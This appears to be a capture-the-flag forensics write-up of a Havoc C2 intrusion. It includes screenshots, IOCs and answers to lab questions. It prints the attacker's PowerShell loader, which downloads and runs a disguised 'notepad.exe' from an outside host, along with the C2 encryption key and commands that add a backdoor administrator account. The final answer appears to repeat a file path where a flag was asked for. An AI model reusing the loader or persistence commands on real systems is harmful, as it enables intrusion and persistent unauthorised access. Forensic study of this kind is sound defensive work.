- **install.ps1**

![Pasted image 20250422211550.png](../../Image/Pasted%20image%2020250422211550.png)

```
$aysXS8Hlhf = "http://10.0.2.37:1337/notepad.exe";
$LA4rJgSPpx = "C:\Users\paco\Downloads\notepad.exe";
Invoke-WebRequest -Uri $aysXS8Hlhf -OutFile $LA4rJgSPpx;
$65lmAtnzW8 = New-ObjectSystem.Net.WebClient;$65lmAtnzW8.DownloadFile($aysXS8Hlhf, $LA4rJgSPpx);
Start-Process -Filepath $LA4rJgSPpx
```
- **Object list:**

![Pasted image 20250422205617.png](../../Image/Pasted%20image%2020250422205617.png)

- **notepad.exe**

![Pasted image 20250422214535.png](../../Image/Pasted%20image%2020250422214535.png)

- **Havoc Artifact** from network traffic
```
[+] Parsing Request
[+] Found Havoc C2
  [-] Agent ID: 0e9fb7d8
  [-] Magic Bytes: deadbeef
  [-] C2 Address: http://10.0.2.37/
  [+] Found AES Key
    [-] Key: 946cf2f65ac2d2b868328a18dedcc296cc40fa28fab41a0c34dcc010984410ca
    [-] IV: 8cd00c3e349290565aaa5a8c3aacd430
```
## IOCs
#### **IP Address:**
- hxxp[:]//10.0.2.37
#### **File:**
- /install.ps1
- /notepad.exe
- /notepad.exe

---
## Answer the question

- What is the SID of the user that the attacker is executing everything under?

![Pasted image 20250422234306.png](../../Image/Pasted%20image%2020250422234306.png)

- What is the Link-local IPv6 Address of the server? Enter the answer exactly as you see it.

![Pasted image 20250422232038.png](../../Image/Pasted%20image%2020250422232038.png)

=> **fe80::e134:1b0c:c8d5:3020%6**

- The attacker printed a flag for us to see. What is that flag?

![Pasted image 20250422232647.png](../../Image/Pasted%20image%2020250422232647.png)

- The attacker added a new account as a persistence mechanism. What is the username and password of that account? Format is **username:password** 

![Pasted image 20250422225827.png](../../Image/Pasted%20image%2020250422225827.png)

```
dir C:\Users\paco\Desktop\
type C:\Users\paco\Desktop\Files\clients.csv
ipconfig
net user administrator WfD3hz3AXZ4n /add
```

- The attacker found an important file on the server. What is the full path of that file?

![Pasted image 20250422232845.png](../../Image/Pasted%20image%2020250422232845.png)

=> **C:\Users\paco\Desktop\Files\clients.csv**

- What is the flag found inside the file from question 5?

![Pasted image 20250422232446.png](../../Image/Pasted%20image%2020250422232446.png)

=> **C:\Users\paco\Desktop\Files\clients.csv**

